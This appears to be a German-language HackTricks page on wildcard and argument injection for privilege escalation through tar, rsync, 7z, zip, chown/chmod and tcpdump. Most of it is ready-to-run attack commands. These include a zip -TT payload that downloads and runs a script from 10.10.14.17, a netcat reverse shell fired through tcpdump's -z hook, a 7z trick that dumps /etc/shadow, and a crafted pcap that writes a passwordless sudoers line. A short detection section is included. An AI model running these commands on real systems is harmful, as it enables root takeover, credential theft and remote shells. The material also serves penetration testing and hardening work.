# Wildcards Spare Tricks

> Wildcard (auch *glob*) **argument injection** tritt auf, wenn ein privilegiertes Script ein Unix-Binary wie `tar`, `chown`, `rsync`, `zip`, `7z`, … mit einem nicht durch Anführungszeichen geschützten Wildcard wie `*` ausführt.
> Da die Shell den Wildcard **vor** der Ausführung des Binary expandiert, kann ein Angreifer, der Dateien im Arbeitsverzeichnis erstellen kann, Dateinamen erzeugen, die mit `-` beginnen, sodass sie als **Optionen statt als Daten** interpretiert werden und dadurch beliebige Flags oder sogar Commands eingeschleust werden können.<sup>[[6]](#references)</sup>
> Diese Seite sammelt die nützlichsten Primitives, aktuelle Forschung und moderne Detections für 2023-2025.

## chown / chmod

Du kannst den **Owner/Group oder die Permission-Bits einer Referenzdatei kopieren**, indem du das Flag `--reference` missbrauchst, wenn ein wie eine Option aussehender Dateiname durch einen Wildcard expandiert wird.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
```bash
# attacker-controlled directory
touch -- .drf.php
chmod 777 -- .drf.php
touch -- "--reference=.drf.php"   # ← filename becomes an argument
```
Wenn root später etwas wie:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
Das expandierte `--reference=.drf.php` überschreibt den explizit angegebenen Besitzer/Modus, sodass übereinstimmende Dateien die Metadaten von `.drf.php` übernehmen (und sie mit dem oben beschriebenen Setup für den Angreifer beschreibbar werden).<sup>[[6]](#references)</sup>

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (kombinierter Angriff).<sup>[[7]](#references)</sup>
Siehe auch das klassische DefenseCode-Paper für weitere Details.<sup>[[6]](#references)</sup>

---

## tar

### GNU tar

Durch den Missbrauch der **checkpoint**-Funktion von GNU tar und der Checkpoint-Aktionen beliebige Befehle ausführen.<sup>[[10]](#references)</sup>
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
```
Sobald root beispielsweise `tar -czf /root/backup.tgz *` ausführt, wird `shell.sh` als root ausgeführt.<sup>[[10]](#references)</sup>

### bsdtar / Caveat beim Überschreiben des macOS-Kompressors

Das standardmäßige `tar` in aktuellen macOS-Versionen (basierend auf `libarchive`) bietet **nicht** die `--checkpoint`-Schnittstelle von GNU tar, aber bsdtar dokumentiert **--use-compress-program** zur Auswahl eines externen Kompressors.<sup>[[11]](#references)</sup>
```bash
# macOS example
touch -- "--use-compress-program=sh"
```
Wenn ein privilegiertes Script `tar -cf backup.tar *` ausführt, wird `sh` über den `PATH` des Opfers ausgewählt, und bsdtar startet es als Compressor.<sup>[[11]](#references)</sup> Dies beweist eine Option Injection, ist jedoch für sich genommen kein zuverlässiger Primitive für beliebige Befehle: Ein durch einen Wildcard erzeugter Dateiname kann kein `/` enthalten, und bsdtar stellt Archivdaten statt eines vom Angreifer ausgewählten Shell-Befehls bereit. Die Codeausführung erfordert zusätzlich ein kontrollierbares Executable, das über den `PATH` oder einen anderen Argumentkanal aufgelöst wird, der den Namen eines nützlichen Programms enthalten kann.

---

## rsync

`rsync` ermöglicht es, die Remote-Shell oder das Remote-Binary über Command-Line-Flags wie `-e` und `--rsync-path` zu überschreiben.<sup>[[12]](#references)</sup>
```bash
# attacker-controlled directory
touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Wenn root das Verzeichnis später mit `rsync -az * backup:/srv/` archiviert, kann die eingeschleuste Option über den Remote-Shell-Mechanismus eine Shell ausführen.<sup>[[7]](#references)[[12]](#references)</sup>

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Selbst wenn das privilegierte Skript das Wildcard-Zeichen *vorsorglich* mit `--` voranstellt (um das Parsen von Optionen zu verhindern), akzeptiert die 7-Zip-CLI **Dateilisten** durch das Voranstellen von `@` vor dem Dateinamen. In Kombination mit einem Symlink können dadurch *beliebige Dateien exfiltriert werden*.<sup>[[13]](#references)</sup>
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Wenn root etwas wie Folgendes ausführt:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip wird versuchen, `root.txt` (→ `/etc/shadow`) als Dateiliste zu lesen, und abbrechen, wobei **der Inhalt nach stderr ausgegeben wird**.<sup>[[13]](#references)</sup>

Dies funktioniert auch mit `-- *`, da die 7-Zip-CLI sowohl reguläre Dateinamen als auch `@listfiles` als Positionsargumente ausdrücklich akzeptiert, sodass ein wörtlicher Dateiname wie `@root.txt` weiterhin speziell behandelt wird.<sup>[[13]](#references)</sup>

---

## zip

Es gibt zwei sehr praktische Primitive, wenn eine Anwendung benutzerkontrollierte Dateinamen an `zip` übergibt (entweder über einen Wildcard oder durch Aufzählung von Namen ohne `--`).<sup>[[2]](#references)[[3]](#references)</sup>

- RCE via test hook: `-T` aktiviert „test archive“, und `-TT <cmd>` ersetzt den Tester durch ein beliebiges Programm (Langform: `--unzip-command <cmd>`). Wenn du Dateinamen einschleusen kannst, die mit `-` beginnen, teile die Flags auf verschiedene Dateinamen auf, damit das Parsen der Short Options funktioniert.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notizen
- Versuche NICHT, einen einzelnen Dateinamen wie `'-T -TT <cmd>'` zu verwenden – kurze Optionen werden zeichenweise geparst, und das wird fehlschlagen. Verwende wie gezeigt separate Tokens.<sup>[[3]](#references)</sup>
- Wenn Schrägstriche von der App aus Dateinamen entfernt werden, rufe einen bare host/IP ab (Standardpfad `/index.html`), speichere ihn lokal mit `-O` und führe ihn anschließend aus.<sup>[[3]](#references)</sup>
- Du kannst das Parsing mit `-sc` (verarbeitete argv anzeigen) oder `-h2` (mehr Hilfe) debuggen, um zu verstehen, wie deine Tokens verarbeitet werden.<sup>[[3]](#references)</sup>

Beispiel (lokales Verhalten mit zip 3.0).<sup>[[3]](#references)</sup>
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Datenexfiltration/leak: Wenn die Web-Schicht die `zip`-Ausgabe von stdout/stderr zurückgibt (häufig bei naiven Wrappers), werden injizierte Flags wie `--help` oder Fehler aufgrund ungültiger Optionen in der HTTP-Antwort sichtbar. Dadurch werden Command-line injection bestätigt und das Feinabstimmen von Payloads erleichtert.<sup>[[3]](#references)</sup>

---

## Zusätzliche Kandidaten für Option-injection

Wenn ein privilegierter Wrapper ein beschreibbares Verzeichnis mit einem Wildcard expandiert, sollten diese dokumentierten Option-Hooks überprüft werden.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

| Binary | Flag zum Ausnutzen | Effekt |
| --- | --- | --- |
| `flock` | `-c <cmd>` | Übergibt einen Befehls-String an eine Shell |
| `git`   | `-c core.sshCommand=<cmd>` | Verwendet `<cmd>` anstelle von SSH für Git fetch/push |
| `scp`   | `-S <program>` | Verwendet ein alternatives SSH-kompatibles Verbindungsprogramm |

Diese Primitives sind zusätzlich zu den klassischen *tar/rsync/zip* nützliche Prüfungen.

---

## Auffinden verwundbarer Wrapper und Jobs

Aktuelle Fallstudien und Hinweise zur Erkennung zeigen, dass wildcard/argv injection nicht mehr nur ein **cron + tar**-Problem ist.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselbe Bug-Klasse tritt weiterhin auf bei:

- Web-Features, die „alles als zip/tar herunterladen“ aus von Angreifern kontrollierten Upload-Verzeichnissen
- Debug-Shells von Herstellern oder Appliances, die einen **tcpdump**-Wrapper mit von Angreifern kontrollierten Dateinamen-/Filterfeldern bereitstellen
- Backup- oder Rotationsjobs, die `tar`, `rsync`, `7z`, `zip`, `chown` oder `chmod` auf beschreibbaren Verzeichnissen aufrufen

Nützliche Triage-Befehle (der `pspy`-Aufruf verwendet die dokumentierten Flags für Prozess-/Datei-Events und Intervalle).<sup>[[14]](#references)</sup>
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Schnelle Heuristiken:

- `-- *` ist eine gute Lösung für viele GNU-Tools, aber **nicht** für `7z`/`7za`, da `@listfiles` separat geparst werden.<sup>[[13]](#references)</sup>
- Bei `zip` sollte man nach Wrappers suchen, die benutzerkontrollierte Dateinamen direkt aufzählen; das Aufteilen von Short-Options (`-T` + `-TT <cmd>`) funktioniert auch ohne einen Shell-Glob.<sup>[[2]](#references)[[3]](#references)</sup>
- Bei `tcpdump` sollte man besonders auf Wrappers achten, die die Kontrolle über **Namen von Ausgabedateien**, **Rotationseinstellungen** oder Argumente für die Wiedergabe von Capture-Dateien ermöglichen.<sup>[[18]](#references)</sup>

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Wenn eine Restricted Shell oder ein Vendor-Wrapper eine `tcpdump`-command line durch das Aneinanderhängen benutzerkontrollierter Felder (z. B. eines Parameters für einen „file name“) ohne strikte Quoting-/Validierung erstellt, können zusätzliche `tcpdump`-Flags eingeschleust werden. Die Kombination aus `-G` (zeitbasierte Rotation), `-W` (Begrenzung der Anzahl von Dateien) und `-z <cmd>` (post-rotate command) ermöglicht die Ausführung beliebiger Commands als der Benutzer, der `tcpdump` ausführt (auf Appliances häufig root).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>

Voraussetzungen:

- Du kannst `argv` beeinflussen, das an `tcpdump` übergeben wird (z. B. über einen Wrapper wie `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
- Der Wrapper bereinigt keine Leerzeichen oder Tokens mit `-`-Präfix im Feld für den Dateinamen.<sup>[[4]](#references)</sup>

Klassischer PoC (führt ein Reverse-Shell-Script aus einem beschreibbaren Pfad aus).<sup>[[4]](#references)[[18]](#references)</sup>
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1` rotiert jede Sekunde, und `-W 1` stoppt nach einer rotierten Datei; der Capture muss vor der Rotation ein passendes Paket empfangen.<sup>[[18]](#references)</sup>
- `-z <cmd>` führt den Post-Rotate-Befehl einmal pro Rotation aus und übergibt den Pfad zur geschlossenen Savefile als Argument; stelle sicher, dass die Argumentverarbeitung von Script/Interpreter zu deinem Payload passt.<sup>[[18]](#references)</sup>

Varianten ohne Wechselmedien:

- Wenn du über ein anderes Primitive zum Schreiben von Dateien verfügst (z. B. einen separaten Command-Wrapper, der Ausgabeumleitung erlaubt), lege dein Script in einem bekannten Pfad ab und löse `-z /path/script.sh` aus; falls erforderlich, soll das Script selbst `/bin/sh` aufrufen.<sup>[[18]](#references)</sup>
- Wenn ein Vendor-Wrapper die Auswahl des Pfads für die rotierte Datei erlaubt, prüfe diese Pfadkontrolle nur in Kombination mit einem Post-Rotate-Befehl, der sein Savefile-Argument interpretiert; die Pfadkontrolle allein führt den Dateiinhalt nicht aus.<sup>[[18]](#references)</sup>

---

## sudoers: tcpdump mit Wildcards/zusätzlichen Argumenten → beliebiges Schreiben/Lesen und root

Beispiel für ein fehlerhaftes sudoers-Muster:<sup>[[3]](#references)</sup>
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Die Regel lässt mehrere Optionen im dokumentierten Parser von `tcpdump` zu:<sup>[[3]](#references)[[18]](#references)</sup>
- Das Glob-Muster `*` und die permissiven Muster beschränken nur das erste `-w`-Argument. `tcpdump` akzeptiert mehrere `-w`-Optionen; die letzte gewinnt.<sup>[[3]](#references)[[18]](#references)</sup>
- Die Regel legt keine anderen Optionen fest, daher sind `-Z`, `-r`, `-V` usw. erlaubt.<sup>[[3]](#references)[[18]](#references)</sup>

Die relevanten Grundfunktionen sind unten dokumentiert.<sup>[[3]](#references)[[18]](#references)</sup>
- Zielpfad mit einem zweiten `-w` überschreiben (das erste erfüllt nur die sudoers-Anforderung).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal innerhalb des ersten `-w`, um den eingeschränkten Verzeichnisbaum zu verlassen.<sup>[[3]](#references)</sup>
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Erzwinge den Besitz der Ausgabedateien mit `-Z root` (erstellt überall Dateien im Besitz von root).<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Schreiben beliebiger Inhalte durch das Abspielen eines manipulierten PCAP über `-r` (z. B. um eine sudoers-Zeile abzulegen).<sup>[[3]](#references)[[18]](#references)</sup>

<details>
<summary>Erstelle ein PCAP, das die exakte ASCII-Nutzlast enthält, und schreibe es als root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Beliebiges Auslesen von Dateien/Secret leak mit `-V <file>` (interpretiert eine Liste von savefiles). Fehlerdiagnosen geben häufig Zeilen wieder und leaken dadurch Inhalte.<sup>[[3]](#references)[[18]](#references)</sup>
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [3] [0xdf - HTB Dump: Zip-Argument-Injection zu RCE + tcpdump-Sudo-Fehlkonfiguration für Privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [4] [FiberGateway GR241AG - Vollständige Exploit-Kette](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [5] [Elastic - Potenzielle Shell über Wildcard-Injection erkannt](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
- [6] [Zurück in die Zukunft: Unix-Wildcards außer Kontrolle (DefenseCode)](https://www.exploit-db.com/papers/33930)
- [7] [wildpwn](https://github.com/localh0t/wildpwn)
- [8] [GNU Coreutils-`chown`-Aufruf](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
- [9] [GNU Coreutils-`chmod`-Aufruf](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
- [10] [GNU-tar-Checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
- [11] [bsdtar(1)-Handbuch](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
- [12] [rsync(1)-Handbuch](https://download.samba.org/pub/rsync/rsync.1)
- [13] [Befehlszeilensyntax von 7-Zip](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
- [14] [pspy](https://github.com/DominicBreuker/pspy)
- [15] [flock(1)-Handbuch](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
- [16] [Dokumentation zur Git-Konfiguration](https://git-scm.com/docs/git-config)
- [17] [OpenBSD-`scp`-Handbuch](https://man.openbsd.org/scp)
- [18] [tcpdump(8)-Handbuch](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
{{#include ../../banners/hacktricks-training.md}}
